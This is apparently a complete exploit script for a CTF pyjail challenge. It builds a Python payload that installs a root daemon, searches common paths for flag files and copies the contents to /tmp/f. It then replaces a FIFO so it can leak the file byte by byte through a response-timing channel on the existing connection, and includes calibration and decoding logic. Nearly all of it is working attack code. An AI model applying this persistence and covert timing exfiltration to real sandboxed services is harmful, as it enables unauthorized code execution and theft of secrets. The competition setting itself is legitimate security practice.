#!/usr/bin/env python3
"""
TFC CTF 2026 - misc/The pyjail - in-band timing exfiltration.

The escape (see gen.py) already gives root command execution in the container,
but the child never inherits the client socket and the pod has no ptrace, so
there's no direct way to send bytes back.  This module builds a channel out of
jail.py's own main loop instead.  Nothing leaves the box: every bit travels on
the TCP connection we already opened.

  stage 0   the restricted eval installs   /app/user.py = exec(open(user_input))
  stage 1   a raw Python body installs a root daemon and copies the flag to
            /tmp/f
  stage 2   the daemon replaces /app/user_input with a FIFO.  jail.py's
            `open("user_input", "wb")` now blocks until the daemon opens the
            read end, so the daemon controls the wall clock gap between
            "Send your code:" and "Running your code...".
  stage 3   each connection asks for one nibble; the gap on the NEXT connection
            carries it.  gap = 0.20 + 0.12 * nibble seconds.

usage:  oracle.py HOST PORT [--reset]
"""
import json
import os
import re
import socket
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
SCRATCH = os.path.join(HERE, '..', 'scratch')
BOOT_EXPR = os.path.join(SCRATCH, 'expr_boot.txt')
CKPT = os.path.join(SCRATCH, 'recovered.json')
DAEMON = os.path.join(HERE, 'daemon_src.py')

BASE, STEP, ERRD = 1.20, 0.12, 1.02
GAP0 = BASE - 1.0                 # gap for value 0
FLAG_RE = re.compile(r'TFCCTF\{[^}\n]*\}')


def setup_body():
    """The raw Python that stage 1 hands to the child."""
    src = open(DAEMON).read()
    return ("import os,glob,subprocess\n"
            "S=%r\n"
            "open('/app/d.py','w').write(S)\n"
            "open('/app/user.py','w').write('')\n"
            "c=['/flag.txt','/flag','/app/flag.txt','/root/flag.txt']\n"
            "for g in ['/flag*','/*flag*','/app/*flag*','/root/*flag*',"
            "'/home/*/*flag*','/tmp/*flag*']:\n"
            "    c+=sorted(glob.glob(g))\n"
            "d=b''\n"
            "for p in c:\n"
            "    try:\n"
            "        x=open(p,'rb').read().strip()\n"
            "    except Exception:\n"
            "        continue\n"
            "    if b'TFCCTF{' in x:\n"
            "        d=x\n"
            "        break\n"
            "    if x and not d:\n"
            "        d=x\n"
            "open('/tmp/f','wb').write(d or b'NOFLAG')\n"
            "p=subprocess.Popen(['python3','/app/d.py'],start_new_session=True,"
            "stdin=subprocess.DEVNULL,stdout=open('/tmp/dlog','ab'),"
            "stderr=subprocess.STDOUT,cwd='/app')\n"
            "w=('while kill -0 %%d 2>/dev/null; do sleep 3; done; "
            "timeout 5 cat /app/user_input >/dev/null 2>&1; "
            "rm -f /app/user_input; : > /app/user_input')%%p.pid\n"
            "subprocess.Popen(['sh','-c',w],start_new_session=True,"
            "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
            "stderr=subprocess.STDOUT)\n" % src)


class Chan:
    """One connection per request.  The gap it reports answers the PREVIOUS
    request, because the daemon only learns what to do after it has read the
    body, and by then jail.py has already sent this connection's banner."""

    def __init__(self, host, port, verbose=True):
        self.host, self.port = host, int(port)
        self.verbose = verbose

    def send(self, body, want_run=True, timeout=40.0):
        s = socket.create_connection((self.host, self.port), timeout=timeout)
        s.settimeout(timeout)
        try:
            s.sendall(body if isinstance(body, bytes) else body.encode())
            # EOF ends jail.py's recv loop just as well as the END sentinel and
            # removes every packet-boundary race from the measurement.
            s.shutdown(socket.SHUT_WR)
            buf, t_ban, t_run = b'', None, None
            while True:
                try:
                    d = s.recv(4096)
                except socket.timeout:
                    break
                now = time.time()
                if not d:
                    break
                buf += d
                if t_ban is None and b'Send your code' in buf:
                    t_ban = now
                if b'Running your code' in buf:
                    t_run = now
                    break
                if not want_run and t_ban is not None:
                    break
            gap = (t_run - t_ban) if (t_run and t_ban) else None
            return gap, buf
        finally:
            try:
                s.close()
            except Exception:
                pass


def decode(gap):
    """gap -> nibble, or None when it isn't a clean bucket."""
    if gap is None or gap < GAP0 - 0.05:
        return None
    v = (gap - GAP0) / STEP
    n = int(round(v))
    if n < 0 or n > 15 or abs(v - n) > 0.34:
        return None
    return n


def load_ck():
    if os.path.exists(CKPT):
        try:
            return json.load(open(CKPT))
        except Exception:
            pass
    return {}


def save_ck(d):
    tmp = CKPT + '.tmp'
    json.dump(d, open(tmp, 'w'))
    os.replace(tmp, CKPT)


def bootstrap(ch):
    expr = open(BOOT_EXPR).read().strip()
    gap, buf = ch.send(expr)
    print('[0] boot expr %d bytes -> %r' % (len(expr), buf[:60]))
    time.sleep(1.5)
    body = setup_body()
    gap, buf = ch.send(body)
    print('[1] setup %d bytes -> %r' % (len(body), buf[:60]))
    time.sleep(1.5)


def calibrate(ch):
    """Ask for known constants and check the gaps land on their buckets."""
    want = [0, 15, 7, 3, 12]
    gaps = []
    prev = None
    for v in want + [0]:
        gap, _ = ch.send('C %d' % v)
        gaps.append(gap)
        if prev is not None:
            print('[2] C %-2d expected %.2f  measured %s  -> %s'
                  % (prev, GAP0 + STEP * prev,
                     ('%.3f' % gap) if gap is not None else 'None',
                     decode(gap)))
        prev = v
    ok = 0
    for v, gap in zip(want, gaps[1:]):
        if decode(gap) == v:
            ok += 1
    print('[2] calibration %d/%d' % (ok, len(want)))
    return ok == len(want)


def recover(ch, path='/tmp/f', maxlen=80):
    ck = load_ck()
    ck.setdefault('path', path)
    if ck.get('path') != path:
        ck = {'path': path}
    got = ck.setdefault('nibbles', {})

    def ask(reqs):
        """Pipeline: gap n answers request n-1."""
        out = []
        prev = None
        for r in reqs + [None]:
            body = r if r is not None else 'C 0'
            gap, _ = ch.send(body)
            if prev is not None:
                out.append(decode(gap))
            prev = r
        return out

    # length first
    if 'len' not in ck:
        vals = ask(['R %s -1 0' % path, 'R %s -1 1' % path])
        if None in vals:
            print('[3] length probe failed: %r' % (vals,))
            return None
        ck['len'] = vals[0] * 16 + vals[1]
        save_ck(ck)
    n = min(ck['len'], maxlen)
    print('[3] flag length %d' % ck['len'])

    for i in range(n):
        if str(i) in got:
            continue
        vals = ask(['R %s %d 0' % (path, i), 'R %s %d 1' % (path, i)])
        if None in vals:
            print('[3] byte %d retry (%r)' % (i, vals))
            vals = ask(['R %s %d 0' % (path, i), 'R %s %d 1' % (path, i)])
        if None in vals:
            print('[3] byte %d unreadable' % i)
            continue
        got[str(i)] = vals[0] * 16 + vals[1]
        save_ck(ck)
        cur = ''.join(chr(got.get(str(k), 63)) for k in range(i + 1))
        print('[3] %2d/%d  %s' % (i + 1, n, cur), flush=True)
        if got[str(i)] == 0x7d:      # '}'
            break
    return ''.join(chr(got[str(k)]) for k in sorted((int(x) for x in got))
                   if str(k) in got)


def main():
    args = [a for a in sys.argv[1:] if not a.startswith('--')]
    host = args[0] if args else '127.0.0.1'
    port = args[1] if len(args) > 1 else '12341'
    if '--reset' in sys.argv and os.path.exists(CKPT):
        os.unlink(CKPT)
    ch = Chan(host, port)
    if '--no-boot' not in sys.argv:
        bootstrap(ch)
    calibrate(ch)
    out = recover(ch)
    print('[+] recovered: %r' % out)
    if out:
        m = FLAG_RE.search(out)
        if m:
            print('[+] FLAG %s' % m.group())
    return 0


if __name__ == '__main__':
    sys.exit(main())
